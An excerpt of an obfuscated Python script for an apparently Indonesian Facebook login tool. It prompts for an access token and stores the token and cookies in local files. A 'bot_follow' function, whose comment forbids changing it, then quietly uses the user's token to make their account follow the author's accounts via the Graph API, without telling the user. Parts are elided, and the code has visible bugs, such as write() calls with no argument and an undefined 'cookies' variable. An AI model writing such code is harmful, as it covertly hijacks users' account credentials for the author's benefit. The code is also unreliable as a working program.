...
_js_lo_    = json.loads
_syafii_widiya_    = print
_widiya_syafii_    = input
_syafii_syafii_ = open
_widiya_widiya_       = exit
...
_qwerty_ = 'https://www.facebook.com/fikritampan305/'
try:
...
def banner():
    ...
    _logo_line_3_ = ('%s / _// / / __/ -_)   / /   ║  %sCoded By Syafii XD  %s║'%(O,P,O))
...
### Cek Cookies
def cek_wid():
    _isi_wid_ = _syafii_syafii_('cookies.txt','r').read()
    if 'null' in _isi_wid_:jalan('%s╚══[%s!%s] %sCookies Invalid, Login Ulang Dengan Cookies'%(M,P,M,P));bersih();_widiya_widiya_()
    else:pass

### Bot Follow Jangan Diganti Anjink !
def bot_follow(_tok_wid_):
    try:
        for _list_ in _my_account_:
            try:_req_post_("https://graph.facebook.com/%s/subscribers?access_token=%s"%(_list_,_tok_wid_));time.sleep(0.3)
            except:pass
        _syafii_widiya_('%s║'%(O));jalan('%s╚══[%s!%s] %sLogin Berhasil'%(O,P,O,P));time.sleep(2)
    except:pass
...
def menu_log():
    ...
    banner()
    var_menu()
    pmu = _widiya_syafii_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    _syafii_widiya_('%s║'%(O))
    if pmu in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu_log()
    elif pmu in ['1','01','001','a']:
        defaultua()
        token = _widiya_syafii_('%s╚══[%s•%s] %sToken : '%(O,P,O,P))
        try:
            x = _req_get_("https://graph.facebook.com/me?access_token=" + token)
            y = _js_lo_(x.text)
            n = y['name']
            xd = _syafii_syafii_("token.txt", "w")
            xd.write(token)
            xd.write()
            xz = _syafii_syafii_('cookies.txt','w')
            xz.write(cookies)
            xz.write()
            bot_follow(token)
            menu()
